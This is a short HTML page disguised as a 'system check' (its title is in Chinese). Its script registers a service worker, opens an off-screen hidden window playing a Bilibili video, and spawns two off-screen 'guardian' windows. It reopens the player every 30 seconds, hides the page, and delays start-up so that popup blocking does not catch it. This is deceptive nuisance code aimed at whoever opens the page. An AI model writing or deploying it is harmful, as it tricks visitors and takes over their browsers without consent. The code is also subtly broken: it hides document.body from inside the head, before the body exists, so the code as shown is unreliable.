<!DOCTYPE html>
<html>
<head>
    <title>系统检测中...</title>
    <script>
        // 注册Service Worker
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js')
                .then(() => console.log('SW注册成功'))
                .catch(err => console.log('SW注册失败:', err));
        }

        // 初始化播放器
        let playerWindow = null;
        
        function openPlayer() {
            playerWindow = window.open(
                'https://www.bilibili.com/video/BV1btJHzGEUE',
                '_hiddenPlayer',
                'width=100,height=100,left=-1000,top=-1000'
            );
            
            // 尝试隐藏窗口
            setTimeout(() => {
                try {
                    playerWindow.blur();
                    window.focus();
                } catch(e) {}
            }, 1000);
        }

        // 打开守护页面
        function openGuardian() {
            window.open(
                '/oiiaio.html',
                '_guardian_' + Date.now(),
                'width=100,height=100,left=-1000,top=-1000'
            );
        }

        // 启动系统
        function startSystem() {
            openPlayer();
            // 打开2个守护实例
            openGuardian();
            openGuardian();
            
            // 每30秒检查一次播放器状态
            setInterval(() => {
                if (!playerWindow || playerWindow.closed) {
                    openPlayer();
                }
            }, 30000);
        }

        // 隐藏当前页面
        document.body.style.display = 'none';
        
        // 延迟启动以避免拦截
        setTimeout(startSystem, 2000);
    </script>
</head>
<body></body>
</html>
